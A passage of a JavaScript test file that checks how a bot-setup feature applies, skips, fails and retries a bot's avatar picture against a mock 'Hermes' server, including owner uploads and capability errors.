    expect(String(ready.text)).toContain("your picture: plane");
    noBytes(String(ready.text));

    const again = cardOf(await hermes.readBotSetup(chatId));
    expect(item(planOf(again), "picture")).toMatchObject({ before: "set:plane", after: "set:plane", status: "same" });
  });

  it("sends no picture for an unticked Picture row", async () => {
    const server = hermes0232();
    const { hermes, chatId } = await withCard(server, cardText({ ...BLOCK, picture: "plane" }));
    const read = cardOf(await hermes.readBotSetup(chatId));
    const plan = planOf(read, [choose(item(planOf(read), "picture"), { ticked: false })]);
    const out = await hermes.applyBotSetup(read, plan, () => {});
    expect(out.states.picture).toBeUndefined();
    expect(assets(server)).toEqual([]);
    expect(server.botAvatars.default).toBeUndefined();
  });

  it("sends nothing about a picture the block gives as a URL or data URL", async () => {
    for (const picture of ["https://example.com/face.png", "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGNgYGD4DwABBAEAwS2OUAAAAABJRU5ErkJggg=="]) {
      const server = hermes0232();
      const { hermes, chatId } = await withCard(server, cardText({ ...BLOCK, picture }));
      const read = cardOf(await hermes.readBotSetup(chatId));
      const plan = planOf(read);
      expect(plan.items.find((i) => i.kind === "picture")).toMatchObject({ status: "notFound" });
      const before = server.requests.length;
      await hermes.applyBotSetup(read, plan, () => {});
      expect(assets(server)).toEqual([]);
      for (const r of server.requests.slice(before)) expect(JSON.stringify(r.params)).not.toContain(picture);
    }
  });

  it("saves the owner's upload, from the bytes the card holds, and only its key goes in the ready turn", async () => {
    const server = hermes0232();
    const { hermes, chatId } = await withCard(server, cardText({ ...BLOCK, picture: "plane" }));
    const read = cardOf(await hermes.readBotSetup(chatId));
    const upload = `data:image/webp;base64,${btoa("RIFF\x16\x00\x00\x00WEBPVP8 owner's own")}`;
    const key = pictureKey(upload)!;
    const plan = planOf(read, [choose(item(planOf(read), "picture"), { to: key })]);
    const sent = writes(server);
    const out = await hermes.applyBotSetup(read, plan, () => {}, {}, { [key]: upload });

    expect(out.states.picture).toEqual({ kind: "applied" });
    expect(assets(server)).toEqual([{ name: "default", asset: "avatar", data: upload }]);
    const [ready] = sent.submits();
    expect(String(ready.text)).toContain("your picture: one the owner uploaded");
    noBytes(String(ready.text));
    expect(String(ready.text)).toContain(key);
  });

  it("fails an upload the card no longer holds, with nothing sent", async () => {
    const server = hermes0232();
    const { hermes, chatId } = await withCard(server, cardText({ ...BLOCK, picture: "plane" }));
    const read = cardOf(await hermes.readBotSetup(chatId));
    const plan = planOf(read, [choose(item(planOf(read), "picture"), { to: "photo:0123456789abcdef" })]);
    const out = await hermes.applyBotSetup(read, plan, () => {});
    expect(out.states.picture).toEqual({ kind: "failed", miss: { kind: "uploadLost" } });
    expect(assets(server)).toEqual([]);
  });

  it("fails with Hermes's reason when it refuses the picture, and Try again saves it", async () => {
    const server = hermes0232();
    const { hermes, chatId } = await withCard(server, cardText({ ...BLOCK, picture: "plane" }));
    const read = cardOf(await hermes.readBotSetup(chatId));
    const setAsset = server.handlers["profiles.set_asset"];
    server.handlers["profiles.set_asset"] = (r) => server.fail(r.id, 4069, "asset too large");
    const out = await hermes.applyBotSetup(read, planOf(read), () => {});
    expect(out.states.picture).toEqual({ kind: "failed", miss: { kind: "profile", failure: { kind: "refused", status: 4069, detail: "asset too large" } } });
    expect(out.states.persona).toEqual({ kind: "applied" });

    server.handlers["profiles.set_asset"] = setAsset;
    expect(await hermes.retryBotSetupItem(read, item(planOf(read), "picture"))).toEqual({ kind: "applied" });
    expect(server.botAvatars.default).toBe(BOT_PICTURE_DATA.plane);
  });

  it("shows the row unavailable on a Hermes that can't check the Bot Mode block, and the other items still apply", async () => {
    const server = hermes0232((s) => (s.uiMetaCas = false));
    const { hermes, chatId } = await withCard(server, cardText({ ...BLOCK, picture: "plane" }));
    const read = cardOf(await hermes.readBotSetup(chatId));
    const plan = planOf(read);
    expect(plan.items.find((i) => i.kind === "picture")).toEqual({ kind: "picture", key: "picture", name: "plane", status: "unavailable", off: { kind: "noCheck" } });
    const out = await hermes.applyBotSetup(read, plan, () => {});
    expect(out.states.persona).toEqual({ kind: "applied" });
    expect(out.states.picture).toBeUndefined();
    expect(assets(server)).toEqual([]);
  });

  it("shows the row unavailable once Hermes is found to lack profiles.set_asset", async () => {
    const server = hermes0232((s) => (s.handlers["profiles.set_asset"] = (r) => s.fail(r.id, -32601, "unknown method: profiles.set_asset")));
    const { hermes, chatId } = await withCard(server, cardText({ ...BLOCK, picture: "plane" }));
    const read = cardOf(await hermes.readBotSetup(chatId));
    const out = await hermes.applyBotSetup(read, planOf(read), () => {});
    expect(out.states.picture).toEqual({ kind: "failed", miss: { kind: "profile", failure: { kind: "noRoute", action: "botPicture" } } });
    const plan = planOf(cardOf(await hermes.readBotSetup(chatId)));
    expect(plan.items.find((i) => i.kind === "picture")).toMatchObject({ status: "unavailable", off: { kind: "noRoute", action: "botPicture" } });
  });

  it("on Set up again, reads the picture Hermes has as before, and keeps it unless the block names another", async () => {
    const server = hermes0232((s) => (s.botAvatars.default = BOT_PICTURE_DATA.moon));
    const { hermes, chatId, me } = await withCard(server, cardText({ ...BLOCK, picture: null }));
    expect((await hermes.botSetupCurrent(me)).picture).toBe("moon");
    const plan = planOf(cardOf(await hermes.readBotSetup(chatId)));
    expect(item(plan, "picture")).toMatchObject({ before: "set:moon", after: "set:moon", status: "same" });
    await hermes.applyBotSetup(cardOf(await hermes.readBotSetup(chatId)), plan, () => {});
    expect(assets(server)).toEqual([]);
  });
});
